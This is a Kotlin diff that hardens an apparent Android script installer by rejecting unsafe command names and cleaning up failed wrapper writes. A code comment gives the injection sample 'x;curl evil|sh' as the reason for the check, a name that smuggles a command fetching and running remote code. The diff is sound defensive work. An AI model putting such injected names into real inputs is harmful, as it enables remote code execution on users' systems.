@@ -62,6 +62,10 @@ object ScriptInstaller {
             if (!entryFile.isContainedIn(packageRoot)) return Result.Rejected
 
             val command = script.command?.takeIf { it.isNotBlank() } ?: commandNameFor(script.entry)
+            // The name lands in a file path, in the generated wrapper-function profile bash sources
+            // on every login, and on the command line - a name like "x;curl evil|sh" or "-rf"
+            // would be shell injection there, so anything outside a plain identifier is refused.
+            if (!isSafeCommandName(command)) return Result.Rejected
             val interpreter = resolveOnPrefix(prefix, script.interpreter)
             val argsSuffix = script.args.joinToString("") { " " + it.shellQuoted() }
 
@@ -72,11 +76,19 @@ object ScriptInstaller {
             // and overwrite whatever's already on PATH. Containment plus a plain existence check
             // covers both: a package never gets to replace a binary it didn't itself just install.
             if (!wrapper.isContainedIn(binDir) || wrapper.exists()) return Result.Rejected
-            wrapper.writeText(
-                "#!${File(prefix, "bin/bash").absolutePath}\n" +
-                    "exec ${interpreter.shellQuoted()} ${entryFile.absolutePath.shellQuoted()}$argsSuffix \"\$@\"\n"
-            )
-            wrapper.setExecutable(true)
+            try {
+                wrapper.writeText(
+                    "#!${File(prefix, "bin/bash").absolutePath}\n" +
+                        "exec ${interpreter.shellQuoted()} ${entryFile.absolutePath.shellQuoted()}$argsSuffix \"\$@\"\n"
+                )
+                if (!wrapper.setExecutable(true)) {
+                    wrapper.delete()
+                    return Result.Rejected
+                }
+            } catch (e: java.io.IOException) {
+                wrapper.delete()
+                return Result.Rejected
+            }
             return Result.Installed(command)
         } finally {
             engine.destroy()
@@ -98,6 +110,15 @@ object ScriptInstaller {
  *  Android runtime - see ScriptInstallerTest. */
 internal fun commandNameFor(entry: String): String =
     File(entry).nameWithoutExtension.ifBlank { "script" }
+
+private val SAFE_COMMAND_NAME = Regex("^[A-Za-z0-9._][A-Za-z0-9._-]{0,63}$")
+
+/** True iff [name] is safe to use as a `prefix/bin` file name and as a bash function name in the
+ *  generated wrapper profile: letters, digits, `.`, `_`, `-` only, no leading `-` (would parse as
+ *  an option), no `/`, at most 64 chars, and not `.`/`..`. Pure for the same testability reason
+ *  as [commandNameFor]; [DistroManager]'s profile writer applies the same rule. */
+internal fun isSafeCommandName(name: String): Boolean =
+    name != "." && name != ".." && SAFE_COMMAND_NAME.matches(name)
 
 /** Single-quotes [this] for safe interpolation into a generated shell wrapper, escaping any
  *  embedded single quote the POSIX-shell way (`'\''`). Pure and Context-free for the same
